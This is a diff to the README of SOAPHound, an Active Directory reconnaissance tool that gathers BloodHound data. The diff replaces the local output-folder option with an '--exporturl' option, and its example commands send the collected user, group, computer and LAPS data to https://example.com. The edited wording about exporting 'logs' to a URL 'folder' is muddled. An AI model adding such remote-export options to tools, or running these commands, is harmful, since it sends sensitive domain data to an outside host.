@@ -31,7 +31,7 @@ Supported collection methods:
   --bhdump                 (Default: false) Dump BH data
 
 Output options:
-  -o, --outputdirectory    Folder to output files to (full path needed)
+  -u, --exporturl          URL to export outputs to 
   -c, --cachefilename      Filename for the cache file (full path needed)
 
 Splitting options:
@@ -92,12 +92,12 @@ After the cache file has been generated, you can use the `--bhdump` collection m
 An example command to collect BloodHound data is (note that this references the cache file generated in the previous step):
 
 ```
-SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bloodhound-output
+SOAPHound.exe -c c:\temp\cache.txt --bhdump --exporturl https://example.com
 ```
 
 If the targeted domain does not use LAPS, you can use the `--nolaps` command line argument to skip the LAPS related data collection. 
 
-This command will generate the `c:\temp\bloodhound-output` folder and produce a number of JSON files that can be imported into BloodHound. 
+This command will export the logs to `https://example.com` folder and produce a number of JSON files that can be imported into BloodHound. 
 The JSON files contain the collected Users, Groups, Computers, Domains, GPOs and Containers, including their relationships. SOAPHound is compatible with Bloodhound version 4. 
 
 ### Dealing with large domains
@@ -111,7 +111,7 @@ The `--threshold` command line argument defines the split threshold based on the
 An example command to collect BloodHound data in AutoSplit mode is:
 
 ```
-SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bloodhound-output --autosplit --threshold 1000
+SOAPHound.exe -c c:\temp\cache.txt --bhdump --exporturl https://example.com --autosplit --threshold 1000
 ```
 
 This will generate the output in batches of a maximum of 1000 objects per starting letter. 
